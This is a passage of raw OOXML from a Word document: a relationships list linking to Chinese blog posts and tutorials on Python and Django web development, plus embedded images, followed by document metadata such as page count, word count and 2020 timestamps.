Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484251&amp;idx=1&amp;sn=b43c0d54c3a894f7eef49626ff6e42c0&amp;chksm=a73c6363904bea7533e2cabf512888ebc0c23d83a1b8b8e8a69a72da0eb9963470fdadd8b561&amp;scene=21" TargetMode="External"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/michaelliao/awesome-python3-webapp/tree/day-03" TargetMode="External"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/sui776265233/p/9664642.html" TargetMode="External"/><Relationship Id="rId158" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image85.png"/><Relationship Id="rId302" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483709&amp;idx=1&amp;sn=a8fc48ab7b1c699a7fdef0bac6d3e69e&amp;chksm=a73c6105904be813db038f203e7a8800ad6bbe32d2bb3243cf8a6d72c10f0419e63c2dc58e6f&amp;scene=21" TargetMode="External"/><Relationship Id="rId323" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483987&amp;idx=1&amp;sn=1e3fe837a73b1bdfa8bac9f4043c2e90&amp;chksm=a73c626b904beb7d2844c497f88b1107bf9642d05f9017562cb7ca8aa69ded9e1bcf5bedec1b&amp;scene=21" TargetMode="External"/><Relationship Id="rId344" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483887&amp;idx=1&amp;sn=7d6f041ba6e223fd696da58b131ea8af&amp;chksm=a73c61d7904be8c1e55415cdebe453e8cfd3455a1b32c71494c225de4e8edd2baf4ebeb11612&amp;scene=21" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.jpeg"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/wdliu/p/9517535.html" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704194216002-1569002729.png" TargetMode="External"/><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image48.png"/><Relationship Id="rId179" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image99.png"/><Relationship Id="rId190" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://xn--nviews-i76j.py/" TargetMode="External"/><Relationship Id="rId204" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMjM5OTMyODA4Nw%3D%3D%26mid%3D2247483914%26idx%3D1%26sn%3D368657c4efc342d7d8e26a23f8209eb0%26chksm%3Da73c6232904beb249bd3705fdd09176b97fac5f49f152f846d5d10a3dac34e9ae88614f4e43d%26scene%3D21%23wechat_redirect" TargetMode="External"/><Relationship Id="rId225" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image115.png"/><Relationship Id="rId246" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483679&amp;idx=2&amp;sn=9e3db4167e408a2a0c3a1037c4f7266a&amp;chksm=a73c6127904be831aee7abe13980fbea5e2d611ceb48e346dc0fc083c0a8725b52ebb3b8106f&amp;scene=21" TargetMode="External"/><Relationship Id="rId267" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId288" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484229&amp;idx=1&amp;sn=be319b3a51cbd5605cb33f9e1b54f1ae&amp;chksm=a73c637d904bea6bf0ea7832e00e81000dd9b55e18df8879ebac718c5478177d3d469eeb64e9&amp;scene=21" TargetMode="External"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706172416387-29917188.png" TargetMode="External"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image70.png"/><Relationship Id="rId313" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483827&amp;idx=1&amp;sn=ba2e487b4721400577e6050dba1885b3&amp;chksm=a73c618b904be89d8fa9e6988755340d124af46182360b440641df83291c62f3dfd99c748f90&amp;scene=21" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.jianshu.com/notebooks/4513499/latest" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image21.jpeg"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704184601786-844978062.png" TargetMode="External"/><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image43.png"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706170622528-1071735500.png" TargetMode="External"/><Relationship Id="rId148" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.djangoproject.com/en/1.9/howto/static-files/deployment/" TargetMode="External"/><Relationship Id="rId169" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.213.name/wp-content/uploads/2017/08/QQ%E6%88%AA%E5%9B%BE20170821154007-1.png" TargetMode="External"/><Relationship Id="rId334" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484170&amp;idx=1&amp;sn=6f89fde6b3390831abcbd2095bf6aac6&amp;chksm=a73c6332904bea244a893962ac1729df73631503782c72537a7f781edc795750fa8dcb69d5a9&amp;scene=21" TargetMode="External"/><Relationship Id="rId355" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/hua1011161696/article/details/80820228" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId180" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image100.png"/><Relationship Id="rId215" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods/ID" TargetMode="External"/><Relationship Id="rId236" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483679&amp;idx=2&amp;sn=9e3db4167e408a2a0c3a1037c4f7266a&amp;chksm=a73c6127904be831aee7abe13980fbea5e2d611ceb48e346dc0fc083c0a8725b52ebb3b8106f&amp;scene=21" TargetMode="External"/><Relationship Id="rId257" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId278" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484126&amp;idx=1&amp;sn=db9e171b03c52aa6bad941ce84caf39c&amp;chksm=a73c62e6904bebf0aac2fd0f994bd5fc19b563a3e9dc1b9774b5b8bd2dd36d655aebda11a496&amp;scene=21" TargetMode="External"/><Relationship Id="rId303" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483739&amp;idx=2&amp;sn=f1081873d87fe2de1a925ffeeb21686a&amp;chksm=a73c6163904be87570e6564769e2b8565a896b37c8964999304c43df151216e3c3e6f551623f&amp;scene=21" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image28.png"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706164559620-1556969039.png" TargetMode="External"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image73.png"/><Relationship Id="rId345" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId191" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://models.py/" TargetMode="External"/><Relationship Id="rId205" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image111.png"/><Relationship Id="rId247" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483716&amp;idx=2&amp;sn=2c0ac2f977c063c67503a9ff3f8d4d0c&amp;chksm=a73c617c904be86a16e7389c3d66760b86e06dd2f5f2f0f0ef6007b38d32647d8700e2a0a48a&amp;scene=21" TargetMode="External"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image60.png"/><Relationship Id="rId289" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.jianshu.com/notebooks/4513499/latest" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.png"/><Relationship Id="rId149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://python.usyiyi.cn/django_182/howto/writing-migrations.html" TargetMode="External"/><Relationship Id="rId314" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483833&amp;idx=1&amp;sn=b75c1c2adfbafbb1356f8a078218c206&amp;chksm=a73c6181904be897b32c043920b0407053789ac73ddcc65fcdfb161351fac30ac265a6193cbb&amp;scene=21" TargetMode="External"/><Relationship Id="rId356" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.csdn.net/weixin_45476498/article/details/99707213" TargetMode="External"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image54.png"/><Relationship Id="rId160" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image87.png"/><Relationship Id="rId216" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods" TargetMode="External"/><Relationship Id="rId258" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483679&amp;idx=2&amp;sn=9e3db4167e408a2a0c3a1037c4f7266a&amp;chksm=a73c6127904be831aee7abe13980fbea5e2d611ceb48e346dc0fc083c0a8725b52ebb3b8106f&amp;scene=21" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.jpeg"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190704210049161-714816794.png" TargetMode="External"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image65.png"/><Relationship Id="rId325" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484006&amp;idx=1&amp;sn=c37fbfbd12ab2d420334b6e3c5bd82e9&amp;chksm=a73c625e904beb481902266835eae575bd3d7b466690413d374cb5db16943e5cd0a5f971ea62&amp;scene=21" TargetMode="External"/><Relationship Id="rId171" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image94.jpeg"/><Relationship Id="rId227" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://yiyibooks.cn/__trs__/xx/django_182/ref/settings.html" TargetMode="External"/><Relationship Id="rId269" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484039&amp;idx=1&amp;sn=b8eb3a88bed07320a24f3a1bd7c8f369&amp;chksm=a73c62bf904beba97215cfd1a22891c412c715de3478980562226beeccddc0aa0e746315e1b8&amp;scene=21" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.jpeg"/><Relationship Id="rId129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1:8000/polls/" TargetMode="External"/><Relationship Id="rId280" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484158&amp;idx=1&amp;sn=ea3bf0979920ef2dba47d9ec2128bf04&amp;chksm=a73c62c6904bebd0b11e5bbe6537e9c0fc1dcf906dc7cf243b6e6d21f12303e2a7b912159cc1&amp;scene=21" TargetMode="External"/><Relationship Id="rId336" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483689&amp;idx=2&amp;sn=1b71deb02467bd5751f379e828cbe0bd&amp;chksm=a73c6111904be807e86c8754702f30b2dc43bdcddef4504aa51527d4155b3de2a2df79368228&amp;scene=21" TargetMode="External"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image44.png"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image75.png"/><Relationship Id="rId182" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/wenyule/p/9740926.html" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes" Target="footnotes.xml"/><Relationship Id="rId238" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId291" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483914&amp;idx=1&amp;sn=368657c4efc342d7d8e26a23f8209eb0&amp;chksm=a73c6232904beb249bd3705fdd09176b97fac5f49f152f846d5d10a3dac34e9ae88614f4e43d&amp;scene=21" TargetMode="External"/><Relationship Id="rId305" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483763&amp;idx=1&amp;sn=14719cba324b3990ce0ed02366bf45a9&amp;chksm=a73c614b904be85d91868a47d133a72f96d690bd8f6e866b49aa75f34d3fc17401c29cae30fd&amp;scene=21" TargetMode="External"/><Relationship Id="rId347" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://pypi.python.org/pypi/wsgiref" TargetMode="External"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706164753071-1784262798.png" TargetMode="External"/><Relationship Id="rId151" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://stackoverflow.com/questions/32123477/django-revert-last-migration" TargetMode="External"/><Relationship Id="rId193" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image107.png"/><Relationship Id="rId207" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image113.png"/><Relationship Id="rId249" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483751&amp;idx=1&amp;sn=3b95782bce522ae3c92afd725de4ce69&amp;chksm=a73c615f904be849b1c371b12038ab5f58fded2de460c16a5d9d8d755ceef58f9682bb0238c1&amp;scene=21" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.jpeg"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image61.png"/><Relationship Id="rId260" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483911&amp;idx=1&amp;sn=cb66b1179996ca1107af279cf40eb5ff&amp;chksm=a73c623f904beb29ebd1c4934ac1cc94e936b6615ed9dd9e258fa1d92d0c04b08c765c6b5d86&amp;scene=21" TargetMode="External"/><Relationship Id="rId316" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483857&amp;idx=1&amp;sn=848e9778942008b5f2a170d44d28bc62&amp;chksm=a73c61e9904be8ffa7facea412fffc94e4e6372c702f1cf0cda8d65cd1e0c66ffb23f914998d&amp;scene=21" TargetMode="External"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image34.png"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image55.png"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image66.png"/><Relationship Id="rId358" Type="http://schemas.microsoft.com/office/2011/relationships/people" Target="people.xml"/><Relationship Id="rId162" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image89.png"/><Relationship Id="rId218" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.example.com/goods/ID" TargetMode="External"/><Relationship Id="rId271" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484102&amp;idx=1&amp;sn=7bd1df46dee7ba89c2c13716449a6221&amp;chksm=a73c62fe904bebe8ae74ac967cb1f9d039abd9eba3b95ccdf2585de4ee5ad3134a30e6ed429f&amp;scene=21" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.jpeg"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190705205852329-967342026.png" TargetMode="External"/><Relationship Id="rId131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image72.png"/><Relationship Id="rId327" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247484034&amp;idx=1&amp;sn=ab08c3498f6a249fb0b43a559f1a00c0&amp;chksm=a73c62ba904bebacf6ee9e8ab88c7a0f8debd7f74a11df508ccf9649994e748f17d9126edfaa&amp;scene=21" TargetMode="External"/><Relationship Id="rId173" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image95.png"/><Relationship Id="rId229" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image117.png"/><Relationship Id="rId240" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483716&amp;idx=2&amp;sn=2c0ac2f977c063c67503a9ff3f8d4d0c&amp;chksm=a73c617c904be86a16e7389c3d66760b86e06dd2f5f2f0f0ef6007b38d32647d8700e2a0a48a&amp;scene=21" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.png"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image45.png"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://img2018.cnblogs.com/blog/1635153/201907/1635153-20190706171346327-1910324612.png" TargetMode="External"/><Relationship Id="rId282" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:void(0);" TargetMode="External"/><Relationship Id="rId338" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mp.weixin.qq.com/s?__biz=MjM5OTMyODA4Nw==&amp;mid=2247483906&amp;idx=1&amp;sn=f126a28ba646dfaa936156bf9dc939a2&amp;chksm=a73c623a904beb2ce0c1e8878da48c03653dc75f7a4b92fdbb2c17de54a3999cafc9765c400a&amp;scene=21" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cnblogs.com/ylcms/p/7261700.html" TargetMode="External"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image77.png"/><Relationship Id="rId184" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image103.jpeg"/><Relationship Id="rId251" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:voi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399A7-FE51-480B-AF2D-A1E11DD83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463</Pages>
  <Words>72391</Words>
  <Characters>412630</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>3438</Lines>
  <Paragraphs>968</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>484053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54</cp:revision>
  <cp:lastPrinted>2020-10-05T15:54:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-08-16T05:42:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-10-05T16:01:00Z</dcterms:modified>
</cp:coreProperties>
</file>